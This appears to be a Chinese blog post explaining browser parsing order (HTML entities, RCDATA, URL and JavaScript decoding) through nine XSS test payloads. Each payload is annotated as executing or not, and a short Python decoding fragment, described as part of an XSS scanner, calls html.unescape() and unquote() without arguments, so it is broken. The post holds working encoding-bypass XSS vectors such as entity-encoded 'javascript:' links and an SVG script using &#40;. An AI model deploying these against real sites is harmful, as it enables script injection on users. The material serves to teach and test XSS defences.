<p>&#x4EC0;&#x4E48;&#x662F;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#xFF1F;<br>&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x5305;&#x62EC;&#x201C;&#x5B57;&#x7B26;&#x503C;&#x5F15;&#x7528;&#x201D;&#x548C;&#x201C;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#x201D;&#x3002;&#x5982;&#x5728;HTML&#x4E2D;&#xFF0C;<code>&lt;</code>&#x5BF9;&#x5E94;&#x7684;&#x5B57;&#x7B26;&#x503C;&#x5F15;&#x7528;&#x4E3A;<code>&amp;#60;</code>&#xFF0C;&#x5BF9;&#x5E94;&#x7684;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#x4E3A;<code>&amp;lt;</code>&#x3002;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#x4E5F;&#x88AB;&#x53EB;&#x505A;&#x201C;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#x201D;&#x6216;&#x201C;&#x5B9E;&#x4F53;&#x201D;<br>&#x2014;&#x2014;&#x300B;&#x518D;&#x6B21;&#x5EF6;&#x4F38;&#x6982;&#x5FF5;: &#x5B57;&#x7B26;&#x5B9E;&#x4F53;<br>&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x662F;&#x4E00;&#x4E2A;&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#xFF0C;&#x5B83;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x822C;&#x65E0;&#x6CD5;&#x5728;&#x6587;&#x672C;&#x5185;&#x5BB9;&#x4E2D;&#x8F93;&#x5165;&#x7684;&#x5355;&#x4E2A;&#x5B57;&#x7B26;&#x6216;&#x7B26;&#x53F7;&#x3002;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x4EE5;&#x4E00;&#x4E2A;<code>&amp;</code>&#x7B26;&#x53F7;&#x5F00;&#x59CB;&#xFF0C;&#x540E;&#x9762;&#x8DDF;&#x7740;&#x4E00;&#x4E2A;&#x9884;&#x5B9A;&#x4E49;&#x7684;&#x5B9E;&#x4F53;&#x7684;&#x540D;&#x79F0;&#xFF0C;&#x6216;&#x662F;&#x4E00;&#x4E2A;<code>#</code>&#x7B26;&#x53F7;&#x4EE5;&#x53CA;&#x5B57;&#x7B26;&#x7684;&#x5341;&#x8FDB;&#x5236;&#x6570;&#x5B57;&#x3002;<br>&#x2014;&#x2014;&#x300B;&#x4EA7;&#x751F;&#x95EE;&#x9898;: &#x4E3A;&#x5565;&#x6211;&#x8981;&#x7528;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x5462;&#xFF0C;&#x8981;&#x7ECF;&#x8FC7;&#x8F6C;&#x4E49;&#x8FD9;&#x4E48;&#x9EBB;&#x70E6;&#x7684;&#x64CD;&#x4F5C; &#x2014;&#x2014;&#x3009;HTML&#x5B57;&#x7B26;&#x5B9E;&#x4F53;<br>&#x5728;HTML&#x4E2D;&#xFF0C;&#x67D0;&#x4E9B;&#x5B57;&#x7B26;&#x662F;&#x9884;&#x7559;&#x7684;&#x3002;&#x4F8B;&#x5982;&#x5728;HTML&#x4E2D;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x201C;&lt;&#x201D;&#x6216;&#x201C;&gt;&#x201D;&#xFF0C;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x6D4F;&#x89C8;&#x5668;&#x53EF;&#x80FD;&#x8BEF;&#x8BA4;&#x4E3A;&#x5B83;&#x4EEC;&#x662F;&#x6807;&#x7B7E;&#x7684;&#x5F00;&#x59CB;&#x6216;&#x7ED3;&#x675F;&#x3002;&#x5982;&#x679C;&#x5E0C;&#x671B;&#x6B63;&#x786E;&#x5730;&#x663E;&#x793A;&#x9884;&#x7559;&#x5B57;&#x7B26;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x5728;HTML&#x4E2D;&#x4F7F;&#x7528;&#x5BF9;&#x5E94;&#x7684;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x3002;</p>
<p>&#x5916;&#x90E8;&#x5143;&#x7D20;&#x5BB9;&#x7EB3;&#x79CD;&#x7C7B;&#x7684;&#x6BD4;&#x7A7A;&#x5143;&#x7D20;&#x3001;&#x539F;&#x59CB;&#x6587;&#x672C;&#x5143;&#x7D20;&#x591A;&#xFF0C;&#x6709;&#x4EC0;&#x4E48;&#x7528;&#x5462;&#xFF1F;<br>Foreign elements &#x2014;&#x2014;&#x300B; SVG&#x9ED1;&#x9B54;&#x6CD5;<br><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code> &#x8FD9;&#x4E2A;payload&#x80FD;&#x6267;&#x884C;&#x7684;&#x539F;&#x56E0;&#x662F;&#x56E0;&#x4E3A; <code>&lt;svg&gt;</code> &#x9075;&#x5FAA;XML&#x548C;SVG&#x7684;&#x5B9A;&#x4E49;&#x3002;&#x5728;XML&#x4E2D;&#xFF0C;<code>&amp;#40;</code>&#x4F1A;&#x88AB;&#x89E3;&#x6790;&#x6210; <code>&#xFF08;</code>&#x3002;&#x540C;&#x7406; <code>&lt;svg&gt;&lt;script&gt;alert&amp;#x28;1);&lt;/script&gt;</code> &#x4E5F;&#x53EF;&#x4EE5;&#x9020;&#x6210; XSS<br>tips: &#x5728;XML&#x4E2D;&#x5B9E;&#x4F53;&#x4F1A;&#x81EA;&#x52A8;&#x8F6C;&#x4E49;,&#x9664;&#x4E86;<code>&lt;![CDATA[</code>&#x548C;<code>]]&gt;</code>&#x5305;&#x542B;&#x7684;&#x5B9E;&#x4F53;</p>
<p>&#x4E0B;&#x9762;&#x5F00;&#x59CB;&#x8FDB;&#x5165;HTML&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x2026;</p>
<p>&#x4E00;&#x4E2A;HTML&#x89E3;&#x6790;&#x5668;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x72B6;&#x6001;&#x673A;&#xFF0C;HTML&#x89E3;&#x6790;&#x5668;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x72B6;&#x6001;&#x3002;&#x8FDB;&#x884C;&#x72B6;&#x6001;&#x8F6C;&#x6362;&#x7684;&#x65B9;&#x5F0F;&#x662F;&#x4ECE;&#x8F93;&#x5165;&#x6D41;&#x4E2D;&#x83B7;&#x53D6;&#x5B57;&#x7B26;&#x5E76;&#x6309;&#x7167;&#x8F6C;&#x6362;&#x89C4;&#x5219;&#x8F6C;&#x6362;&#x3002;&#x4EE5; <code>&lt;start&gt;content&lt;/end&gt;</code> &#x4E3A;&#x4F8B;&#x5B50;&#x3002;HTML&#x8BC6;&#x522B;&#x5F00;&#x59CB;&#x548C;&#x7ED3;&#x675F;&#x6807;&#x7B7E;&#x7684;&#x6838;&#x5FC3;&#x662F; <code>/</code> &#x7B26;&#x53F7;&#x3002;&#x5F53;HTML&#x89E3;&#x6790;&#x5668;&#x9047;&#x5230; <code>&lt;</code>  &#x4E14;&#x6CA1;&#x6709; <code>/</code> &#x3002;&#x5C31;&#x4F1A;&#x8FDB;&#x5165; <strong>&#x6807;&#x7B7E;&#x5F00;&#x59CB;&#x72B6;&#x6001;</strong> &#x7136;&#x540E;&#x8F6C;&#x53D8;&#x5230; <strong>&#x6807;&#x7B7E;&#x540D;&#x72B6;&#x6001;</strong>&#xFF0C; <strong>&#x524D;&#x5C5E;&#x6027;&#x540D;&#x72B6;&#x6001;</strong> &#x2026; &#x6700;&#x540E;&#x8FDB;&#x5165; <strong>&#x6570;&#x636E;&#x72B6;&#x6001;</strong>&#x3002; &#x5E76;&#x91CA;&#x653E;&#x5F53;&#x524D;&#x6807;&#x7B7E;&#x7684;token&#x3002;&#x5F53;&#x89E3;&#x6790;&#x5668;&#x5904;&#x4E8E;<strong>&#x6570;&#x636E;&#x72B6;&#x6001;</strong>&#x65F6;&#xFF0C;&#x5B83;&#x4F1A;&#x7EE7;&#x7EED;&#x89E3;&#x6790;&#xFF0C;&#x6BCF;&#x5F53;&#x53D1;&#x73B0;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x5C31;&#x4F1A;&#x91CA;&#x653E;&#x51FA;&#x4E00;&#x4E2A;token&#x3002;</p>
<p>&#x5BB9;&#x7EB3;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x7684;&#x4F5C;&#x7528;: &#x5728;&#x8FD9;&#x4E9B;&#x72B6;&#x6001;&#x4E2D;HTML&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x5C06;&#x4F1A;&#x4ECE; <code>&amp;#...</code>&#x5F62;&#x5F0F;&#x89E3;&#x7801;&#x3002;&#x4E09;&#x79CD;&#x60C5;&#x51B5;&#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#xFF1A; <strong>&#x6570;&#x636E;&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;</strong>&#xFF0C;<strong>RCDATA&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;</strong>&#x548C;<strong>&#x5C5E;&#x6027;&#x503C;&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;</strong>&#x3002;</p>
<p>&#x6709;&#x4E00;&#x79CD;&#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x7684;&#x60C5;&#x51B5;&#x662F; <strong>RCDATA&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;</strong>&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5728;<code>&lt;textarea&gt;</code>&#x548C;<code>&lt;title&gt;</code>&#x6807;&#x7B7E;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x4F1A;&#x88AB;HTML&#x89E3;&#x6790;&#x5668;&#x89E3;&#x7801;&#x3002;&#x4E14;&#x5728;&#x89E3;&#x6790;&#x8FD9;&#x4E9B;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E0D;&#x4F1A;&#x8FDB;&#x5165; <strong>&#x6807;&#x7B7E;&#x5F00;&#x59CB;&#x72B6;&#x6001;</strong> &#x3002;&#x5BF9;RCDATA&#x6709;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x89E3;&#x6790;RCDATA&#x5143;&#x7D20;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x8FDB;&#x5165; <strong>RCDATA&#x72B6;&#x6001;</strong>&#x3002;&#x5728;&#x8FD9;&#x4E2A;&#x72B6;&#x6001;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x9047;&#x5230;<code>&lt;</code>&#x5B57;&#x7B26;&#xFF0C;&#x5B83;&#x4F1A;&#x8F6C;&#x6362;&#x5230;RCDATA&#x5C0F;&#x4E8E;&#x53F7;&#x72B6;&#x6001;&#x3002;&#x5982;&#x679C;&lt;&#x5B57;&#x7B26;&#x540E;&#x6CA1;&#x6709;&#x7D27;&#x8DDF;&#x7740;/&#x548C;&#x5BF9;&#x5E94;&#x7684;&#x6807;&#x7B7E;&#x540D;&#xFF0C;&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x8F6C;&#x6362;&#x56DE;RCDATA&#x72B6;&#x6001;&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5728;RCDATA&#x5143;&#x7D20;&#x6807;&#x7B7E;&#x7684;&#x5185;&#x5BB9;&#x4E2D;&#xFF08;&#x4F8B;&#x5982;<code>&lt;textarea&gt;</code>&#x6216;<code>&lt;title&gt;</code>&#x7684;&#x5185;&#x5BB9;&#x4E2D;&#xFF09;&#xFF0C;&#x552F;&#x4E00;&#x80FD;&#x591F;&#x88AB;&#x89E3;&#x6790;&#x5668;&#x8BA4;&#x505A;&#x662F;&#x6807;&#x7B7E;&#x7684;&#x5C31;&#x662F;<code>&lt;/textarea&gt;</code>&#x6216;&#x8005;<code>&lt;/title&gt;</code>&#x3002;&#x5F53;&#x7136;&#xFF0C;&#x8FD9;&#x8981;&#x770B;&#x5F00;&#x59CB;&#x6807;&#x7B7E;&#x662F;&#x54EA;&#x4E00;&#x4E2A;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5728;<code>&lt;textarea&gt;</code>&#x548C;<code>&lt;title&gt;</code>&#x7684;&#x5185;&#x5BB9;&#x4E2D;&#x4E0D;&#x4F1A;&#x521B;&#x5EFA;&#x6807;&#x7B7E;&#xFF0C;&#x4E0D;&#x4F1A;&#x6709;&#x811A;&#x672C;&#x6267;&#x884C;&#x3002;</p>
<h3 id="URL-&#x89E3;&#x6790;"><a href="#URL-&#x89E3;&#x6790;" class="headerlink" title="URL &#x89E3;&#x6790;"></a>URL &#x89E3;&#x6790;</h3><p>URL&#x8D44;&#x6E90;&#x7C7B;&#x578B;&#x5FC5;&#x987B;&#x662F;ASCII&#x5B57;&#x6BCD;<code>&#xFF08;U+0041-U+005A || U+0061-U+007A&#xFF09;</code>&#xFF0C;&#x4E0D;&#x7136;&#x5C31;&#x4F1A;&#x8FDB;&#x5165;&#x201C;&#x65E0;&#x7C7B;&#x578B;&#x201D;&#x72B6;&#x6001;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x4F60;&#x4E0D;&#x80FD;&#x5BF9;&#x534F;&#x8BAE;&#x7C7B;&#x578B;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x7684;&#x7F16;&#x7801;&#x64CD;&#x4F5C;&#xFF0C;&#x4E0D;&#x7136;URL&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x8BA4;&#x4E3A;&#x5B83;&#x65E0;&#x7C7B;&#x578B;&#x3002;</p>
<h3 id="JavaScript-&#x89E3;&#x6790;"><a href="#JavaScript-&#x89E3;&#x6790;" class="headerlink" title="JavaScript &#x89E3;&#x6790;"></a>JavaScript &#x89E3;&#x6790;</h3><p>Unicode&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#x53EA;&#x6709;&#x5728;&#x6807;&#x8BC6;&#x7B26;&#x540D;&#x79F0;&#x91CC;&#x4E0D;&#x88AB;&#x5F53;&#x4F5C;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4E5F;&#x53EA;&#x6709;&#x5728;&#x6807;&#x8BC6;&#x7B26;&#x540D;&#x79F0;&#x91CC;&#x7684;&#x7F16;&#x7801;&#x5B57;&#x7B26;&#x80FD;&#x591F;&#x88AB;&#x6B63;&#x5E38;&#x7684;&#x89E3;&#x6790;&#x3002;javascript&#x89E3;&#x7801;&#x5668;&#x65E0;&#x6CD5;&#x8BD5;&#x522B;&#x7F16;&#x7801;&#x540E;&#x7684;&#x63A7;&#x5236;&#x5B57;&#x7B26;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x53CC;&#x5F15;&#x53F7;&#x548C;&#x5706;&#x62EC;&#x53F7;&#xFF0C;&#x4E4B;&#x540E;&#x4F1A;&#x7528;&#x4E00;&#x4E9B;&#x4F8B;&#x5B50;&#x8FDB;&#x884C;&#x8BE6;&#x7EC6;&#x8BF4;&#x660E;&#x3002;</p>
<h3 id="Python-&#x8F6C;&#x7801;&#x811A;&#x672C;"><a href="#Python-&#x8F6C;&#x7801;&#x811A;&#x672C;" class="headerlink" title="Python &#x8F6C;&#x7801;&#x811A;&#x672C;"></a>Python &#x8F6C;&#x7801;&#x811A;&#x672C;</h3><p>&#x81EA;&#x5DF1;&#x6700;&#x8FD1;&#x5728;&#x5199;&#x4E00;&#x4E2A;XSS&#x7684;&#x626B;&#x63CF;&#x811A;&#x672C;&#xFF0C;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x6A21;&#x5757;&#x5177;&#x6709;&#x5224;&#x65AD; XSS payload &#x7684;&#x6709;&#x6548;&#x6027;&#x7684;&#x529F;&#x80FD;&#x3002;&#x8FD9;&#x91CC;&#x7ED9;&#x51FA;&#x90E8;&#x5206;&#x8F6C;&#x7801;&#x7247;&#x6BB5;</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> html</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">payload = <span class="hljs-string">&apos;&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decodeHTML</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    dh = html.unescape()</span><br><span class="line">    <span class="hljs-keyword">return</span> dh</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decodeURL</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    du = unquote()</span><br><span class="line">    <span class="hljs-keyword">return</span> du</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decodeUnicode</span><span class="hljs-params">(payload)</span>:</span></span><br><span class="line">    duni = payload.encode(<span class="hljs-string">&apos;utf-8&apos;</span>).decode(<span class="hljs-string">&apos;unicode_escape&apos;</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> duni</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="&#x4ECE;payload&#x770B;&#x89E3;&#x6790;&#x6D41;&#x7A0B;"><a href="#&#x4ECE;payload&#x770B;&#x89E3;&#x6790;&#x6D41;&#x7A0B;" class="headerlink" title="&#x4ECE;payload&#x770B;&#x89E3;&#x6790;&#x6D41;&#x7A0B;"></a>&#x4ECE;payload&#x770B;&#x89E3;&#x6790;&#x6D41;&#x7A0B;</h3><p>1&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: &#x8BC6;&#x522B;&#x5230; href &#xFF0C;&#x5C5E;&#x6027;&#x503C;&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x3002;&#x8FDB;&#x5165;url&#x6A21;&#x5757;&#x89E3;&#x6790;&#x3002;URL&#x89C4;&#x5B9A;&#x534F;&#x8BAE;&#xFF0C;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x5BC6;&#x7801;&#x90FD;&#x5FC5;&#x987B;&#x662F;ASCII&#x3002;&#x4E14;&#x4E0D;&#x80FD;&#x5BF9;&#x534F;&#x8BAE;&#x7C7B;&#x578B;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x7684;&#x7F16;&#x7801;&#x64CD;&#x4F5C;&#x3002;&#x8FD9;&#x91CC;&#x7684; <code>javascript</code> &#x534F;&#x8BAE;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x3002;<p></p>
<p>2&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: &#x5C5E;&#x6027;&#x503C;&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x3002;&#x8BC6;&#x522B;&#x5230;&#x5B9E;&#x4F53;&#x5316;&#x7F16;&#x7801;&#x5185;&#x5BB9;&#xFF0C;&#x8FDB;&#x5165;html&#x89E3;&#x7801;&#x5F97;&#x5230; <code>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;</code>&#x3002;&#x7136;&#x540E;&#x8FDB;&#x5165; URL &#x89E3;&#x6790;&#x3002;&#x6B64;&#x65F6;&#x53EF;&#x6B63;&#x786E;&#x8BC6;&#x522B;&#x534F;&#x8BAE;&#x7C7B;&#x578B;&#x3002;&#x89E3;&#x7801;&#x5F97;&#x5230;<code>&lt;a href=&quot;javascript:alert(2)&quot;&gt;</code> &#x6700;&#x540E; JavaScript &#x89E3;&#x6790;&#x3002;</p>
<p>3&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript%3aalert(3)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;&#x540C;&#x4E00;&#xFF0C; &#x8FD9;&#x91CC; <code>javascript:</code> &#x4E3A;&#x534F;&#x8BAE;&#xFF0C;&#x4EFB;&#x4F55;&#x4E00;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#x90FD;&#x4E0D;&#x80FD;&#x7F16;&#x7801;</p>
<p>4&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: &#x5C5E;&#x6027;&#x503C;&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#xFF0C;&#x5148;&#x8FDB;&#x884C; HTML &#x89E3;&#x6790;&#x3002;&#x4F46; HTML &#x89E3;&#x6790;&#x673A;&#x5236;&#x4E2D;<code>&amp;#60;</code>&#x4F1A;&#x88AB; HTML &#x89E3;&#x7801;&#xFF0C;&#x4F46;&#x4E0D;&#x4F1A;&#x8FDB;&#x5165;&#x6807;&#x7B7E;&#x5F00;&#x59CB;&#x72B6;&#x6001;&#xFF0C;&#x5F53;&#x7136;&#x4E5F;&#x5C31;&#x4E0D;&#x4F1A;&#x521B;&#x5EFA; img &#x5143;&#x7D20;&#x3002;(HTML&#x7F16;&#x7801;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x663E;&#x793A;&#x8FD9;&#x4E9B;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#xFF0C;&#x800C;&#x4E0D;&#x5E72;&#x6270;&#x6B63;&#x5E38;&#x7684;DOM&#x89E3;&#x6790;)<p></p>
<p>5&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;&#x4E3A;: <code>&lt;textarea&gt;</code>&#x662F;RCDATA&#x5143;&#x7D20;&#xFF0C;&#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x6587;&#x672C;&#x548C;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#xFF0C;&#x6CE8;&#x610F;&#x4E0D;&#x80FD;&#x5BB9;&#x7EB3;&#x5176;&#x4ED6;&#x5143;&#x7D20;&#xFF0C;HTML&#x89E3;&#x7801;&#x5F97;&#x5230;<code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code>&#x4F46; <code>&lt;textarea&gt;</code>&#x53EA;&#x5BB9;&#x7EB3;&#x6587;&#x672C;&#x548C;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x3002;&#x56E0;&#x6B64;js&#x65E0;&#x6CD5;&#x6267;&#x884C;<p></p>
<p>6&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(6)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;&#x540C;5<p></p>
<p>7&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;confirm(&apos;7&amp;#39;);&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: &#x5C5E;&#x6027;&#x503C;&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#xFF0C;&#x5148;&#x8FDB;&#x884C;HTML&#x89E3;&#x7801;&#x3002;&#x7136;&#x540E;JS&#x6267;&#x884C;<p></p>
<p>8&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;confirm(&apos;8\u0027);&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: &#x5728;JavaScript&#x4E2D;&#xFF0C;&#x6807;&#x8BC6;&#x7B26;&#x53EA;&#x80FD;&#x5305;&#x542B;&#x5B57;&#x6BCD;&#x6216;&#x6570;&#x5B57;&#x6216;&#x4E0B;&#x5212;&#x7EBF;&#xFF08;&#x201C;<code>_</code>&#x201D;&#xFF09;&#x6216;&#x7F8E;&#x5143;&#x7B26;&#x53F7;&#xFF08;&#x201C;<code>$</code>&#x201D;&#xFF09;&#xFF0C;&#x4E14;&#x4E0D;&#x80FD;&#x4EE5;&#x6570;&#x5B57;&#x5F00;&#x5934;&#x3002; <code>onclick</code>&#x4E2D;&#x7684;&#x503C;&#x4F1A;&#x4EA4;&#x7ED9;JS&#x5904;&#x7406;&#xFF0C;&#x5728;JS&#x4E2D;&#x53EA;&#x6709;&#x5B57;&#x7B26;&#x4E32;&#x548C;&#x6807;&#x8BC6;&#x7B26;&#x80FD;&#x7528;Unicode&#x8868;&#x793A;&#xFF0C;<code>&apos;</code>&#x663E;&#x7136;&#x4E0D;&#x884C;&#xFF0C;JS&#x6267;&#x884C;&#x5931;&#x8D25;&#x3002;<p></p>
<p>9&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: <code>script</code>&#x6807;&#x7B7E;&#x5C5E;&#x4E8E;&#x539F;&#x59CB;&#x6587;&#x672C;&#x5143;&#x7D20;&#x3002;&#x65E0;&#x6CD5;&#x5BB9;&#x7EB3;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x6CD5;&#x8FDB;&#x884C;HTML&#x89E3;&#x7801;&#x3002;&#x56E0;&#x6B64;JS&#x89E3;&#x6790;&#x65F6;&#x5E76;&#x4E0D;&#x80FD;&#x6267;&#x884C;&#x5F39;&#x7A97;<p></p>
